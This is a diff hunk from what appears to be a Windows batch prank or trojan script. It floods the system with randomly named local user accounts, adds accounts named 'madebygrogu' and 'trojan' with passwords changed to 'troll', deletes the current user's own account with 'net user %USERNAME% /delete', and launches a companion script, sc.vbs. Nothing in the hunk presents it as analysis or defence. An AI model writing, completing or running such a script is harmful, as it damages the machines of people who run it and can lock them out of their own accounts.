@@ -247,8 +247,8 @@ net user %random% %random% /add
 net user %random% %random% /add
 net user %random% %random% /add
 net user %random% %random% /add
-net user madebygrogu %random% /add
-net user wenomechainsamaversion2 %random% /add
+net user madebygrogu troll /add
+net user wenomechainsamaversion2 troll /add
 net user 𝓽𝓻𝓸𝓳𝓪𝓷 death /add
 net user %USERNAME% /delete
 start sc.vbs
